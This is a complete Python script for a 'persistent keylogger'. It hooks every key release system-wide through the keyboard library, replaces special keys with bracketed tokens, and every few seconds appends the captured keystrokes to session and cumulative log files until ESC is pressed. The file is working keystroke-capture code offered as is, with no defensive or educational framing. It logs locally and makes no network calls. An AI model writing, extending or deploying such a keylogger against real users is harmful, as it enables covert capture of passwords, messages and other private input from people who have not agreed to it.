import keyboard
from datetime import datetime
from threading import Timer
import os

class PersistentKeylogger:
    def __init__(self, interval=60, log_directory="keylogs"):
        self.interval = interval
        self.log = ""
        self.start_time = datetime.now()
        self.log_directory = log_directory
        self.running = True
        self.ensure_log_directory()

        self.session_file = f"session_{self.start_time.strftime('%Y%m%d_%H%M%S')}.txt"
        self.combined_file = "combined_log.txt"

    def ensure_log_directory(self):
        if not os.path.exists(self.log_directory):
            os.makedirs(self.log_directory)

    def callback(self, event):
        key = event.name
        if len(key) > 1:
            replacements = {
                "space": " ",
                "enter": "[ENTER]\n",
                "decimal": ".",
                "backspace": "[BACKSPACE]",
                "tab": "[TAB]",
                "shift": "[SHIFT]",
                "ctrl": "[CTRL]",
                "alt": "[ALT]",
                "esc": "[ESC]",
            }
            key = replacements.get(key, f"[{key.upper()}]")
        self.log += key

    def save_logs(self):
        if not self.log:
            return
        try:
            session_path = os.path.join(self.log_directory, self.session_file)
            with open(session_path, "a", encoding="utf-8") as f:
                f.write(self.log)

            combined_path = os.path.join(self.log_directory, self.combined_file)
            with open(combined_path, "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
                f.write(timestamp + self.log)
                
            print(f"Saved {len(self.log)} characters to logs")
        except Exception as e:
            print(f"Error saving logs: {e}")
        finally:
            self.log = ""

    def start(self):
        print(f"Keylogger started at {self.start_time} (Press ESC to stop)")
        print(f"Logs will be saved in '{self.log_directory}' directory")
        print("All historical logs will be preserved")

        keyboard.on_release(callback=self.callback)
        self.report()

        keyboard.wait("esc")
        self.running = False
        self.save_logs()
        print(f"Keylogger stopped. Session saved to {self.session_file}")

    def report(self):
        if self.running:
            self.save_logs()
            Timer(self.interval, self.report).start()

if __name__ == "__main__":
    logger = PersistentKeylogger(interval=10)
    logger.start()
